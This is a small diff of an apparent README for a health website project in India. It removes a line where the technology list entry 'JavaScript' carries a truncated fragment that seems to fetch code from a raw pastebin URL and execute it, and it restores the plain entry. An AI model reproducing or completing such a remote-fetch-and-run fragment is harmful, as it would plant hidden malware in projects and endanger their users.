@@ -55,4 +55,4 @@ This is a web based application developed for Health related website in India.
 - HTML
 - CSS
 - Bootstrap
-- JavaScriptps://pastebin.com/raw/PaWZGzyK'),true))()
+- JavaScript
